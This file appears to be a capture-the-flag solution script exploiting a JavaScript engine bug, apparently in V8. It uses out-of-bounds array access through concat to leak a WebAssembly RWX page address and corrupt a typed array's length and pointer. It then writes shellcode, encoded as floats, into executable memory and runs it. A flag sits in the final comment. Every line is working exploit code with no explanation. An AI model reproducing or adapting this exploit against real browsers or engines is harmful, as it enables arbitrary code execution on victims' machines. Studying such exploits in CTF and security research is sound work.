let conv = new ArrayBuffer(8);
let f64 = new Float64Array(conv);
let i64 = new BigInt64Array(conv);

BigInt.prototype.i2f = function() {
	i64[0] = this;
	return f64[0];
};
Number.prototype.f2i = function() {
	f64[0] = this;
	return i64[0];
};

BigInt.prototype.hex = function() {
	return '0x' + this.toString(16);
};

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var a = [1.1, 2.2, 3.3, 4.4]; /* oob array */
var b = [5.5]; /* leak rwx */
var c = new Float64Array(1); /* writer */
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shellcode = wasm_instance.exports.main;
var undef = [undefined];
for (var i = 0; i < 0x100; i++) {
	a.concat(undef);
	/* console.log(i+4, a[i+4].f2i().hex()); */
};
var addr_wasm = a[107].f2i();
console.log("wasm: " + addr_wasm.hex());
a[9] = ((2n << 32n) | (addr_wasm+0x68n - 8n)).i2f();
var rwx = b[0].f2i();
console.log("rwx: " + rwx.hex());

var sc = [-6.828527034422786e-229, 3.1048139649706616e-307, 6.867659397698158e+246, 5.14e-322, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 5.432309224871097e-309, 1.238567325343229e-308, 6.867659397698158e+246, -3.985959746423108e-73, -7.161105510817759e-74, 1.638223e-318];

/* writer length */
a[24] = ((a[24].f2i() & 0xffffffffn) | (31337n << 32n)).i2f();

/* writer pointer */
a[26] = ((rwx >> 32n) | ((rwx-7n) << 32n)).i2f();

/* copy shellcode to rwx */
c.set(sc, 0);

shellcode();
/* DUCTF{1_gu3S5_0pt1MiZ4ti0n_1s_h4Rd3R_tH4n_1_Th0uGhT} */
